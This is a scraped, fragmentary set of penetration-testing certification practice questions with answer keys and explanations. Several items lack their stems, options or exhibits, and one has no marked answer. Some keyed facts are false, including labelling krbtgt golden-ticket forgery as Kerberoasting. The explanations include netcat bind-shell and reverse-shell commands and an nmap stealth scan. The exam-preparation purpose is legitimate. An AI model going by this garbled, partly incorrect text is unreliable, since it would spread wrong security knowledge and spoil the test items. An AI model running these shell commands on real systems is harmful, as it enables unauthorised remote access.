OBJ-3.3: Each vulnerability mentioned poses a significant risk, but the greatest threat comes from the SQL injection. An SQL injection could allow an attacker to retrieve our data from the backend database directly. Using this technique, the attacker could also alter the data and put it back, and nobody would notice everything that had been changed, thereby also affecting our data integrity. The HTTP TRACE/TRACK methods are normally used to return the full HTTP request to the requesting client for proxy-debugging purposes and allow the attacker to access sensitive information in the HTTP headers. Since this only exposes information in the headers, it minimizes the risk to our system's data confidentiality. An SSL server with SSLv3 enabled is not ideal since this is an older encryption type, but it still provides some confidentiality. The phpinfo information disclosure vulnerability prints out detailed information on both the system and the PHP configuration. This information by itself doesn't disclose any information about the data stored within the system, though, so it isn't a great threat to our data's confidentiality.

  Decompile the application with JAD

  (正確)

- 

  Brute force the source code using Hydra

- 

  Use Peach to conduct fuzzing

#### 解釋

OBJ-5.3: To conduct a static analysis, you need to have the source code. Since the company didn't provide it, you can use the Java bytecode (binary) and a decompiler to create the source code. JAD is a Java Application Decompiler. Brute forcing the application with hydra wouldn’t provide you with the source code. It would only provide a password. Debuggers can be useful, but they will return bytecode level information and not source code. Peach is a great fuzzing tool, but fuzzing is a dynamic technique and not a static one.

OBJ-3.7: Privilege escalation attacks seek to increase the access level that an attacker has to a target system. Privilege escalation is the act of exploiting a bug, design flaw, or configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user. Spear phishing is an email or electronic communications scam targeted towards a specific individual, organization, or business. Cross-Site Scripting (XSS) attacks are a type of injection in which malicious scripts are injected into otherwise benign and trusted websites. Remote code execution is the ability an attacker has to access someone else's computing device and make changes, no matter where the device is geographically located.

You have been contracted to conduct a penetration test against Dion Training's learning management system (LMS). The company wants to determine how effectively their LMS can scale up during periods of high student demand without negatively affecting the student experience. Which of the following things in your engagement documentation would be the MOST important to ensuring successful load testing?

- 

  If a known or unknown environment test will be utilized

- 

  If a certificate pinning exception will be used

- 

  The IP addresses of the servers

- 

  The time of day used for conducting the test

  (正確)

#### 解釋

OBJ-1.2: The time of day used for conducting the test is critically important based on this engagement's goals. This engagement seeks to determine if their LMS can quickly scale up in response to increase student demand. This is not just a bandwidth test or simple load test, but they also want to determine if the customer/student experience is affected. To determine that, the engagement must occur while many real students are also online and taking the courses.

Which of the following best describes the data structure presented above?

- 

  Array

  (正確)

- 

  Key-value pair

- 

  JSON

- 

  CSV

#### 解釋

OBJ-5.1: An array is a data structure consisting of a collection of elements, each identified by at least one array index or key. A key-value pair is made of a key name and a value of that key separated by a colon(:), such as type:intrusion-set. JSON is an open standard data encoding format of data representation that can be used and manipulated easily with scripts. It is designed to be human-readable and machine-processable. It is based on JavaScript concepts but is entirely script and language-independent. A comma-separated value (CSV) file is a file where entries are separated by commas. CSV files were originally used as an export from spreadsheets but have since become a very popular way to import and export data.

You have been contracted by Dion Training to conduct a penetration test against its learning management system (LMS). The LMS is a web application that is hosted in the organization's DMZ. Which of the following appliance allow lists should the organization add your source IP in before the engagement begins?

- 

  NIDS

- 

  DLP

- 

  WAF

  (正確)

- 

  HIDS

#### 解釋

OBJ-1.2: The learning management system (LMS) is a web application, therefore the source IP of the attacking workstation needs to be added to the web application firewall’s allow list to prevent it from being blocked. Adding a source IP address to the allow list will exclude it from ACL rules and other signatures. This prevents an active device, like a web application firewall (WAF), layer 4 firewall, or an intrusion protection system (IPS) from blocking the penetration tester during the assessment. By having your IP added to the allow list, you can focus your time and efforts on finding vulnerabilities with the servers themselves instead of trying to break through a compensating control like a WAF or IPS.

A cybersecurity analyst is applying for a new job with a penetration testing firm. He received the job application as a secured Adobe PDF file, but unfortunately, the firm locked the file with a password so the potential employee could not fill in the application. Instead of asking for an unlocked copy of the document, the analyst decides to write a script in Python to attempt to unlock the PDF file by using passwords from a list of commonly used passwords until he can find the correct password or attempts every password in his list. Based on this description, what kind of cryptographic attack did the analyst perform?

- 

  Session hijacking

- 

  Dictionary attack

  (正確)

- 

  Brute-force attack

- 

  On-path attack

#### 解釋

OBJ-3.1: A dictionary attack is a technique for defeating a cipher or authentication mechanism by trying to determine its decryption key or passphrase by trying hundreds or sometimes millions of likely possibilities, such as words in a dictionary. The key to answering this question is that they were using passwords from a list. A brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. A session hijacking attack compromises the session token by stealing or predicting a valid session token to gain unauthorized access to the webserver. An on-path attack is an attack where the attacker secretly relays and possibly alters the communications between two parties who believe that they are directly communicating with each other.

You are working as a penetration tester conducting an engagement against Dion Training's corporate network. The known-environment assessment was designed to take four months of reconnaissance and two weeks of active engagement. The first week is focused on breaching the external perimeter, and the second week is focused on the internal servers. Your team has spent the last 3 months researching ways to exploit and bypass the firewalls and IPS at Dion Training. You just received a call from Dion Training stating that they just replaced their firewalls and IPS appliances with a state-of-the-art UTM. You recommend to the client that if you cannot exploit the UTM within the first 3 days, your team's source IP addresses should be allow listed to focus their time on the internal network. Which of the following BEST describes this scenario?

- 

  Goal reprioritization

  (正確)

- 

  De-escalation

- 

  De-confliction

- 

  Situational awareness

#### 解釋

OBJ-4.3: A penetration test is a fluid process based on the people, processes, and technology involved. When the company changed its architecture, it essentially invalidated much of the research your team conducted. The recommendation to allow list the source IP addresses is a goal reprioritization. Without adequate preparation time, it is unlikely you will exploit or bypass the new UTM appliances. Therefore, you suggest that the client reprioritize the engagement to focus on the internal network during this assessment to make the best use of your time and resources.

An analyst reviews the logs from the network and notices that there have been multiple attempts from the open wireless network to access the networked HVAC control system. The open wireless network must remain openly available so that visitors can access the internet. How can this type of attack be prevented from occurring in the future?

- 

  Install an IDS to protect the HVAC system

- 

  Implement a VLAN to separate the HVAC control system from the open wireless network

  (正確)

- 

  Enable NAC on the open wireless network

- 

  Enable WPA2 security on the open wireless network

#### 解釋

OBJ-4.2: A VLAN is useful to segment out network traffic to various parts of the network and stop someone from the open wireless network from logging to the HVAC controls. By utilizing NAC, each machine connected to the open wireless network could be checked for compliance and determine if it is a 'known' machine, but they would still be given access to the entire network. Also, since this is a publicly usable network, using NAC could prevent users from accessing all the network features. An IDS would be a good solution to detect the attempted logins, but it won't prevent them. Instead, an IPS would be required to prevent logins.

You are planning an engagement with a new client. The client wants your penetration testers to target their web and email servers that are hosted in a screened subnet and are accessible to visitors over the Internet. Which target type best describes these targets?

- 

  External

  (正確)

- 

  Third-party hosted

- 

  First-party hosted

- 

  Internal

#### 解釋

OBJ-1.2: An external target type best describes these targets since the question doesn’t clearly describe if the servers are first-party or third-party hosted. An external target type is an asset that can be accessed from outside of the organization. For example, if the webserver is visible on the Internet, it is considered an external target. An internal target type means that assets can be accessed from within the organization. This can either be physically or logically from within the network, and it best simulates an insider threat. This target type can also be used to simulate an external hacker who has gained credentials on the network, such as using a spear phishing attack. First-party hosted targets are assets hosted by the client organization themselves. Third-party hosted targets are assets hosted by a vendor, partner, or cloud service provider.

You are conducting a penetration test against an organization's Windows network. You have dumped the hash of their krbtgt account from the server's memory and used it to create golden tickets. Which of the following types of privilege escalation have you performed?

- 

  cPassword extraction

- 

  DLL hijacking

- 

  Insecure sudo

- 

  Kerberoasting

  (正確)

#### 解釋

OBJ-3.1: Kerberoasting is the dumping of the hash of the krbtgt (kerberos ticket-granting ticket) from a server's memory using a domain-based user account. This is then used to create new golden tickets that allow any domain user to request the Ticket Granting Ticket from a domain service account. This can be cracked offline to reveal the plaintext password of the account. Many Windows services run with administrative privileges, and most system administrators don't frequently change these passwords. This can lead to an attacker gaining access to a domain for a long period of time.

You are conducting a social engineering attack against an organization as part of an engagement. You run over to a busy employee and quickly push a USB drive in their face. "Quick, quick, I am running late for my presentation. Please, print out the PDF on this drive for me!" The employee looks unwilling to help, but you continue to explain how you are running out of time and need their assistance. What type of social engineering principle is being exploited here?

- 

  Scarcity

- 

  Trust

- 

  Urgency

  (正確)

- 

  Authority

#### 解釋

OBJ-3.6: Urgency is focused on the element of time. An attacker encourages the victim to act quickly, which often leads to them making security mistakes. Urgency is related to scarcity, and the two are often effectively used together. Scarcity is used to create a fear in a person of missing out on a special deal or offer. This technique is used in advertising all the time, such as "supplies are limited," "only available for the next 4 hours", and other such artificial limitations being used. Authority is used to take advantage of people's willingness to act when directed to by someone with the power or right to give orders. For example, an attacker may pose as a police officer, government agent, or high-level executive to force an employee to take some form of action, whether it is ethically dubious or counter to their interests.

During your reconnaissance, you have determined that your client has devices used to send remote control signals to industrial assets used by their critical infrastructure utilities connected to their corporate network. Which of the following methods would MOST likely be the best method for exploiting these systems?

- 

  Use social engineering to trick a user into opening a malicious APK

- 

  Identify a jailbroken device for easy exploitation

- 

  Use a spearphishing campaign to trick a user into installing a RAT

- 

  Use Metasploit modules designed to target the SCADA systems

  (正確)

#### 解釋

OBJ-3.5: A penetration tester can exploit supervisory control and data acquisition (SCADA) systems if they are within the engagement's scope. While Metasploit was initially designed for engagements against workstations and servers, Metasploit has several modules in the exploit/ windows/scada category that target vendor-specific SCADA components running Windows. Many of these trigger a buffer overflow, though, so be careful when using them and ensure you have permission to exploit these devices in your written authorization.

Based on the output above, which of the following exploits are you using?

- 

  FTP exploit

- 

  SMB exploit

- 

  SNMP exploit

- 

  SMTP exploit

  (正確)

#### 解釋

OBJ-3.1: If you see a question like this, don't let it confuse you. Look for keywords and phrases that you recognize to answer the question. As you look at the command issued in the first line, you may not recognize it. That is because this is an older exploit script that is being run with the parameters of support (the user account we are trying to exploit), DionTraining (our penetration testing machine's name), and RedHat (our target/victim server). Ignoring this line, look at the second line where you see a keyword that you should recognize: Sendmail. Sendmail is a service that runs on Linux machines to "send mail" using the SMTP protocol over port 25. This is the key to answering this question. As you continue through the script, you see it performed a DNS name resolution from RedHat to the server's IP, connected to the server, and successfully sent the exploit. This exploit conducts a buffer overflow against a vulnerable Sendmail server resulting in the server providing a remote callback to a listening port on the attacker's machine (port 2525). This is why the attacker then telnets into their localhost over port 2525 and runs the whoami command to determine what user they are connected to the victimized server as. In this case, they are reported as the root user, which means this SMTP exploit was successful.

An organization has hired a cybersecurity analyst to conduct an assessment of its current security posture. The analyst begins by conducting an external assessment against the organization's network to determine what information is exposed to a potential external attacker. What technique should the analyst perform first?

- 

  Intranet portal reviews

- 

  Enumeration

  (正確)

- 

  DNS query log reviews

- 

  Technical control audits

#### 解釋

OBJ-2.2: Scanning and enumeration are used to determine open ports and identify the software and firmware/device types running on the host. This is also referred to as footprinting or fingerprinting. This technique is used to create a security profile of an organization by using a methodological manner to conduct the scanning. If this scan is conducted from outside of the organization’s network, it can be used to determine the network devices and information available to an unauthorized and external attacker. A DNS query log review, intranet portal review, or technical control audit would require internal access to the network, which is typically not accessible directly to an external attacker.

  XML injection

- 

  SQL injection

  (正確)

- 

  Header manipulation

- 

  Cross-site scripting

#### 解釋

OBJ-3.3: SQL injection is a code injection technique that is used to attack data-driven applications. SQL injections are conducted by inserting malicious SQL statements into an entry field for execution. For example, an attacker may try to dump the contents of the database by using this technique. A common SQL injection technique is to insert an always true statement, such as 1 == 1, or in this example, 7 == 7. Header manipulation is the insertion of malicious data, which has not been validated, into an HTTP response header. XML Injection is an attack technique used to manipulate or compromise an XML application or service's logic. The injection of unintended XML content and/or structures into an XML message can alter the application's intended logic. Cross-Site Scripting (XSS) attacks are a type of injection in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in a browser side script, to a different end-user.

Dion Training wants to increase the speed of response from its secure web servers when users attempt to connect to it. The company wants to enable a feature that will allow the webserver to host its SSL/TLS certificate status itself and have it time-stamped periodically by the issuing CA. This method would allow the student’s web browser to only connect to the website instead of creating an individual certificate status query to the CA each time they try to connect to the site. Which of the following PKI solutions should Dion Training implement to achieve this?

- 

  Online certificate status protocol

- 

  Certificate pinning

- 

  Certificate stapling

  (正確)

- 

  Certificate revocation list

#### 解釋

OBJ-4.2: Certificate stapling allows a webserver to perform certificate status checking instead of having the browser perform the checking. The web server checks the status of a certificate and provides the browser with the digitally signed response from the OCSP responder. Certificate stapling is much faster than using individual queries to the CA using OCSP. The online certificate status protocol (OSCP) allows clients to request the status of a digital certificate and to check whether it is revoked. A certificate revocation list (CRL) is a list of every digital certificate that has been revoked before its expiration date. Certificate pinning is a deprecated method of trusting digital certificates that bypasses the CA hierarchy and chain of trust to minimize on-path (formerly man-in-the-middle) attacks.

OBJ-1.1: The Driver’s Privacy Protection Act (DPPA) governs the privacy and disclosure of personal information gathered by state Departments of Motor Vehicles. The Health Insurance Portability and Accountability Act (HIPAA) is a privacy rule that establishes national standards to protect the privacy of individuals’ medical records. The General Data Protection Regulation (GDPR) is a regulation created in the European Union that creates provisions and requirements to protect the personal data of European Union (EU) citizens. Transfers of personal data outside the EU Single Market are restricted unless protected by like-for-like regulations, such as the US’s Privacy Shield requirements. The Gramm-Leach-Bliley Act (GLBA) requires financial institutions to ensure the security and confidentiality of client information and take steps to keep customer information secure.

You are conducting a wireless penetration test against an organization. You have identified that they are using WEP encryption on their wireless access points. You are impatient and do not want to wait to collect enough packets to find a repeated initialization vector. You decide to extract part of the key material from one of the packets and use it to send an ARP request to the AP. Which of the following exploits did you utilize in this attack?

- 

  Downgrade attack

- 

  Fragmentation attack

  (正確)

- 

  Deauthentication attack

- 

  Karma attack

#### 解釋

OBJ-3.2: A fragmentation attack obtains the pseudorandom generation algorithm (PRGA) of network packets used in WEP. The PRGA can be used to craft encrypted packets that you can inject into the access point. These injected packets can speed up cracking the WEP password; otherwise, it might take a while to receive enough packets to get the repeated IV. In a fragmentation attack, you extract part of the key material from at least one packet and use this to send an ARP request to the AP. If successful, the AP responds with more of the key material in the packet echoed back to you. You repeat this process many times until around 1500 bytes of the PRGA is captured, at which point you can then use a packet crafting tool to begin the injection process. A downgrade attack forces a client to use a weaker SSL version that the attacker can crack. Deauthentication attacks are used in the service of an evil twin, replay, cracking, denial of service, and other attacks. All 802.11 Wi-Fi protocols include a management frame that a client can use to announce that it wishes to terminate a connection with an access point. The victim's device will be kicked off the access point by spoofing the victim's MAC address and sending the deauthentication frame to the access point. A karma attack is a variant of the evil twin attack. A karma attack exploits the behavior of a wireless client trying to connect to its preferred network list. This list contains the SSIDs of access points the device has connected to in the past. When a wireless device is looking to connect to the internet, it firsts beacons to determine if any of these previously connected networks are within range.

  Returns no useful results for an attacker

- 

  Returns all web pages hosted at diontraining.com

- 

  Returns all web pages containing the text diontraining.com

#### 解釋

OBJ-2.1: Google interprets this statement as <anything>@diontraining.com and understands that the user is searching for email addresses since %40 is the hex code for the @ symbol. The * is a wild card character meaning that any text could be substituted for the * in the query. This type of search would provide an attacker with a list of email addresses associated with diontraining.com, which could be used as part of a spear phishing campaign. To return all web pages hosted at diontraining.com, you should use the "site:" modifier in the query. To return all web pages with the text diontraining.com, enter "diontraining.com" into the Google search bar with no modifiers to return those results.

  nc -lp 31337

- 

  nc -lp 31337 -e /bin/sh

  (正確)

#### 解釋

OBJ-3.7: A bind shell is established when a victim system "binds" its shell to a local network port. To achieve this using netcat, you should execute the command "nc -lp 31337 -e /bin/sh" on the victim machine. This sets up a listener on the machine on port 31337 and will execute the /bin/sh when another machine connects to its listener on port 31337. The attacker would enter the command "nc 192.168.1.53 31337" to connect to the victim's bind shell. A reverse shell is established when the target machine communicates with an attack machine listening on a specific port. To set up a listener on the attack machine, you would use the command "nc -lp 31337" on it. To connect to the attacking machine from the victim machine, you would enter the command "nc 192.168.1.53 31337 –e /bin/sh" on it.

OBJ-2.4: If the cybersecurity analyst were to reduce the scans' sensitivity, it still would not decrease the time spent scanning the network and could alter the effectiveness of the results received. In this scenario, the scans, as currently scoped, are taking more than 24 hours to complete with the current resources. The analyst could reduce the scans' scope, thereby scanning fewer systems or vulnerabilities signatures and taking less time to complete. Alternatively, the analyst could reduce the scans' frequency by moving to a less frequent schedule, such as one scan every 48 hours or one scan per week. The final option would be to add additional vulnerability scanners to the process. This would allow the two scanners to work together to divide the workload and complete the task within the 24-hour scan frequency currently provided.

You just visited an e-commerce website by typing in its URL during a vulnerability assessment. You discovered that an administrative web frontend for the server's backend application is accessible over the internet. Testing this frontend, you discovered that the default password for the application is accepted. Which of the following recommendations should you make to the website owner to remediate this discovered vulnerability? (SELECT THREE)

- 

  Rename the URL to a more obscure name

- 

  Create an allow list for the specific IP blocks that use this application

  (正確)

- 

  Require two-factor authentication for access to the application

  (正確)

- 

  Conduct a penetration test against the organization's IP space

- 

  Require an alphanumeric passphrase for the application's default password

- 

  Change the username and default password

  (正確)

#### 解釋

OBJ-3.5: First, you should change the username and default password since using default credentials is extremely insecure. Second, you should implement an allow list for any specific IP blocks with access to this application's administrative web frontend since it should only be a few system administrators and power users. Next, you should implement two-factor authentication to access the application since two-factor authentication provides more security than a simple username and password combination. You should not rename the URL to a more obscure name since security by obscurity is not considered a good security practice. You also should not require an alphanumeric passphrase for the application's default password. Since it is a default password, you can not change the password requirements without the vendor conducting a software update to the application. Finally, while it may be a good idea to conduct a penetration test against the organization's IP space to identify other vulnerabilities, it will not positively affect remediating this identified vulnerability.

What type of attack was most likely being attempted by the attacker?

- 

  Password spraying

- 

  Impersonation

- 

  Brute force

  (正確)

- 

  Credential stuffing

#### 解釋

OBJ-3.1: This is an example of a brute force attack. Unlike password spraying that focuses on attempting only one or two passwords per user, a brute force attack focuses on trying multiple passwords for a single user. The goal of this attack is to crack the user's password and gain access to their account. Password spraying, instead, refers to the attack method that takes a large number of usernames and loops them with a single password. We can use multiple iterations using several different passwords, but the number of passwords attempted is usually low compared to the number of users attempted. This method avoids password lockouts, and it is often more effective at uncovering weak passwords than targeting specific users. If only one or two attempts are being made to each username listed, then this could be indicative of a password spraying attack instead of a brute force attempt against a single user. Impersonation is the act of pretending to be another person for fraudulent purposes. Credential stuffing is the automated injection of breached username/password pairs to gain user accounts access fraudulently. This is a subset of the brute force attack category: large numbers of spilled credentials are automatically entered into websites until they are potentially matched to an existing account. The attacker can then hijack the account for their purposes.

Which of the following types of attacks occurs when an attacker attempts to gain confidential information or login credentials by sending targeted emails to a specific set of recipients within an organization?

- 

  Spear phishing

  (正確)

- 

  Phishing

- 

  Zero-day

- 

  Spoofing

#### 解釋

OBJ-3.6: Spear phishing is the fraudulent practice of sending emails from a seemingly known or trusted sender to induce targeted individuals to reveal confidential information. The key to answering this question is that the attack was focused on a targeted set of people, not just an indiscriminate large group of random people. Phishing is an email-based social engineering attack in which the attacker sends an email from a supposedly reputable source, such as a bank, to try to elicit private information from the victim. A zero-day vulnerability is when the vendor is aware of a security flaw, but a patch has not been developed or applied on an affected system. At this point, a malicious actor can craft an attack and take advantage of the zero-day vulnerability. Spoofing is a type of attack that disguises a communication from an unknown source as being from a known, trusted source. Spoofing can occur using different methods, such as MAC spoofing, IP spoofing, call spoofing, and others.

Which technique would provide the largest increase in security on a network with ICS, SCADA, or IoT devices?

- 

  Installation of anti-virus tools

- 

  Use of a host-based IDS or IPS

- 

  User and entity behavior analytics

  (正確)

- 

  Implement endpoint protection platforms

#### 解釋

OBJ-4.2: Since ICS, SCADA, and IoT devices often run proprietary, inaccessible, or unpatchable operating systems, the traditional tools used to detect the presence of malicious cyber activity in normal enterprise networks will not function properly. Therefore, user and entity behavior analytics (UEBA) is best suited to detect and classify known-good behavior from these systems to create a baseline. Once a known-good baseline is established, deviations can be detected and analyzed. UEBA may be heavily dependent on advanced computing techniques like artificial intelligence and machine learning and may have a higher false-positive rate. As the name suggests, the analytics software tracks user account behavior across different devices and cloud services. Entity refers to machine accounts, such as client workstations or virtualized server instances, and embedded hardware, such as the Internet of Things (IoT) devices. Traditional technologies include anti-virus tools, host-based IDS and IPS, and endpoint protection platforms.

A pentester is trying to map the organization's internal network. The analyst enters the following command (nmap -n -sS -T4 -p 80 10.0.3.0/24). What type of scan is this?

- 

  Quick Scan

- 

  Intense Scan

- 

  Comprehensive Scan

- 

  Stealth Scan

  (正確)

#### 解釋

OBJ-2.4: In nmap, the -sS flag signifies a stealth scan. This is also known as an SYN scan and is the most popular scan option for good reasons. It can be performed quickly, scanning thousands of ports per second on a fast network, and is not hampered by restrictive firewalls. It is also relatively unobtrusive and stealthy since it never completes TCP connections.

A factory relies on a legacy workstation running Windows XP that is used as part of an ICS/SCADA system to control their industrial factory equipment. The workstation is connected to an isolated and air gapped network that cannot reach the internet. The workstation receives the patterns for the manufactured designs through a flash drive. Which of the following types of attacks would be most successful in infecting this workstation with malware as part of your penetration test?

- 

  USB key drop

  (正確)

- 

  Watering hole

- 

  Blind SQL injection

- 

  Side-channel attack

#### 解釋

OBJ-3.6: A USB key drop attack is a type of social engineering attack that occurs when an attacker strategically places a USB device somewhere, potentially containing malicious code, with the intention of someone taking it and plugging it into a computer. This is a commonly used method of attacking an air gapped network or workstation. A watering hole attack is a strategy where an attacker guesses or observes which websites an organization often uses and infects one or more of them with malware. A side-channel attack is a security exploit that aims to gather information from or influence the program execution of a system by measuring or exploiting indirect effects of the system or its hardware rather than targeting the program or its code directly. Blind SQL injections (blind SQLi) occur when a web application is exposed to SQL injection, but its HTTP responses don't contain the results of the SQL query or any details of database errors.

During active reconnaissance, a penetration tester conducts a vulnerability scan. The most recent scan found several vulnerabilities on an organization’s public-facing IP addresses. Which of the following vulnerabilities should the penetration tester attempt first in their exploitation phase?

- 

  An HTTP response that reveals an internal IP address

- 

  A buffer overflow that is known to allow remote code execution

  (正確)

- 

  A website utilizing a self-signed SSL certificate

- 

  A cryptographically weak encryption cipher

#### 解釋

OBJ-2.4: The most serious vulnerability discovered is one that could allow remote code execution to occur. Since this buffer overflow vulnerability is known to allow remote code execution, the penetration tester should attempt it first. If this is successfully exploited, the penetration tester should immediately notify the organization so it can be prioritized for remediation immediately to prevent a future security breach. While the other issues may provide information or access for the penetration tester, the most critical would be a remote code execution vulnerability on a public-facing IP address.

![img](https://img-c.udemycdn.com/redactor/raw/quiz_question/2022-01-17_05-33-01-90a257f42ad44d7f68ed64aa72d530aa.png)

Which of the following commands would display all of the lines from the firewall.log file that contain the destination IP address of 10.1.0.10 and a destination port of 23?

- 

  grep "10\.1\.0\.10\," firewall.log | grep "23"

- 

  grep "10.1.0.10," firewall.log | grep "23$"

- 

  grep "10.1.0.10," firewall.log | grep "23"

- 

  grep "10\.1\.0\.10\," firewall.log | grep "23$"

  (正確)

#### 解釋

OBJ-5.2: The easiest way to do this is with a grep command. In Linux, you can chain together commands by piping data from one command's output to serve as the input to another command. In this scenario, you can use grep to find all the lines with the IP address first. Then, you can use the second grep command to find all the lines using port 23. The result is a smaller, filtered list of events to analyze. When using the dot in the IP addresses, you must remember to escape this character. Otherwise, grep treats it as a special character in a regular expression treated as any character (except a line break). Adding the \ before the dot (\.), grep treats it simply as a dot or period. You must also escape the comma for it to be processed properly. The $ after the port number is used to indicate that the number should only be counted as a match if it is at the end of the line. This ensures that we only return the destination ports (DPT) matching 23 and not the source port (SPT).

A software assurance test analyst performs a dynamic assessment on an application by automatically generating random data sets and inputting them in an attempt to cause an error or failure condition. Which technique is the analyst utilizing?

- 

  Sequential data sets

- 

  Known bad data injection

- 

  Static code analysis

- 

  Fuzzing

  (正確)

#### 解釋

OBJ-4.2: Fuzzing is an automated software assessment technique that involves providing invalid, unexpected, or random data as inputs to a computer program. The program is then monitored for exceptions (crashes), failing built-in code assertions, or finding potential memory leaks. Static code analysis is a method of debugging by examining source code before a program is run. Known bad data injection is a technique where data known to cause an exception or fault is entered as part of the testing/assessment. With known bad data injections, you would not use randomly generated data sets, though.

Syed is developing a vulnerability scanner program for a large network of sensors to monitor his company's transcontinental oil pipeline. What type of network is this?

- 

  CAN

- 

  BAS

- 

  SoC

- 

  SCADA

#### 解釋

OBJ-3.5: SCADA (supervisory control and data acquisition) networks work off an ICS (industry control system) and maintain sensors and control systems over large geographic areas. A building automation system (BAS) for offices and data centers ("smart buildings") can include physical access control systems, but also heating, ventilation, and air conditioning (HVAC), fire control, power and lighting, and elevators, and escalators. A vehicular network is called a controller area network (CAN). A CAN uses serial communication buses to connect electronic control units and other subsystems in cars and unmanned aerial vehicles (UAV). System-on-chip (SoC) is a design where all these processors, controllers, and devices are provided on a single processor die or chip.

After reviewing the packet above, you discovered there is an unauthorized service running on the host. Which of the following ACL entries should be implemented to prevent further access to the unauthorized service while maintaining full access to the approved services running on this host?

- 

  DENY IP HOST 71.168.10.45 ANY EQ 25

- 

  DENY IP HOST 86.18.10.3 EQ 3389

- 

  DENY TCP ANY HOST 71.168.10.45 EQ 3389

  (正確)

#### 解釋

OBJ-4.2: Since the question asks you to prevent unauthorized service access, we need to block port 3389 from accepting connections on 71.168.10.45 (the host). This option will deny ANY workstation from connecting to this machine (host) over the Remote Desktop Protocol service that is unauthorized (port 3389).

- 

  COSO

- 

  GLBA

- 

  HIPAA

  (正確)

- 

  SOX

#### 解釋

OBJ-1.1: The Health Insurance Portability and Accountability Act (HIPAA) was created primarily to modernize the flow of healthcare information, stipulate how Personally Identifiable Information maintained by the healthcare and healthcare insurance industries should be protected from fraud and theft, and address limitations on healthcare insurance coverage. This is a federal law that must be followed in the United States. The Gramm-Leach-Bliley Act (GLBA) requires financial institutions to explain their information-sharing practices to their customers and safeguard sensitive data. This includes companies that offer consumers financial products or services like loans, financial or investment advice, or insurance. The Sarbanes-Oxley Act of 2002 is a federal law that established sweeping auditing and financial regulations for public companies. Lawmakers created the legislation to help protect shareholders, employees, and the public from accounting errors and fraudulent financial practices. The Committee of Sponsoring Organizations of the Treadway Commission (COSO) guides governance-related topics, including fraud, controls, finance, and ethics. COSO’s ERM-integrated framework defines risk, and related common terminology lists key components of risk management strategies and supplies direction and criteria for enhancing risk management practices.

  Perform a DNS brute-force attack

  (正確)

- 

  Use a nmap ping sweep

- 

  Use a nmap stealth scan

-

#### 解釋

OBJ-2.2: The best course of action is to perform a DNS brute-force attack. The DNS brute-force attack queries a list of IPs and typically bypasses IDS/IPS systems that do not alert on DNS queries. A ping sweep or a stealth scan can be easily detected by the IPS, depending on the signatures and settings being used. A DNS zone transfer is also something that often has a signature search for it and will be alerted upon since it is a common attack technique.

- 

  11.154.12.121 is a client that is accessing an SSH server over port 52497

#### 解釋

OBJ-2.3: This output from the tcpdump command is displaying three packets in a larger sequence of events. Based solely on these three packets, we can only be certain that the server (11.154.12.121) runs an SSH server over port 22. This is based on the first line of the output. The second and third lines are the server responding to the request and sending data back to the client (10.0.19.121) over port 52497. There is no evidence of an attack against either the server or the client based on this output since we can only see the headers and not the content being sent between the client and server.

- 

  Recommend that the company conduct a full penetration test of their systems to identify other vulnerabilities

- 

  Conduct a proof-of-concept exploit on three user accounts at random and document this in your report

- 

  Document the finding with an executive summary, methodology used, and a remediation recommendation

  (正確)

- 

  Contact the development team directly and recommend adding input validation to the web application

#### 解釋

OBJ-4.1: When you find a vulnerability, it should be documented fully. This includes providing an executive summary for management, the methodology used to find the vulnerability so that others can recreate and verify it, and the recommendation remediation actions that should be taken. You should not exploit three random accounts on the server, which could negatively impact the client's reputation. You should not contact the development team directly since they may ignore your recommendation, and they did not hire you. While it may be a good idea to conduct a full-scale penetration test, that would not necessarily solve this vulnerability.

Vulnerability scans must be conducted continuously to meet regulatory compliance requirements for the storage of PHI. During the last vulnerability scan, a cybersecurity analyst received a report of 2,592 possible vulnerabilities and was asked by the Chief Information Security Officer (CISO) for a plan to remediate all the known issues. Which of the following should the analyst do next?

- 

  Attempt to identify all the false positives and exceptions, then resolve any remaining items

- 

  Wait to perform any additional scanning until the current list of vulnerabilities have been remediated fully

- 

  Filter the scan results to include only those items listed as critical in the asset inventory and remediate those vulnerabilities first

  (正確)

- 

  Place any assets that contain PHI in a sandbox environment and then remediate all the vulnerabilities

#### 解釋

OBJ-2.4: PHI is an abbreviation for Personal Health Information. When attempting to remediate numerous vulnerabilities, it is crucial to prioritize the vulnerabilities to determine which ones should be remediated first. In this case, there is a regulatory requirement to ensure the security of the PHI data. Therefore, those critical assets to the secure handling or storage of PHI are of the highest risk should be prioritized for remediation first. It is impractical to resolve all 2,592 vulnerabilities at once. Therefore, you should not identify all the false positives and exceptions and then resolve any remaining items since they won't be prioritized for remediation. You should also not wait to perform additional scanning because a scan is only a snapshot of your current status. If it takes 30 days to remediate all the vulnerabilities and do not scan, new vulnerabilities may have been introduced. Placing all the PHI assets into a sandbox will not work either because you have removed them from the production environment and can no longer serve their critical business functions.
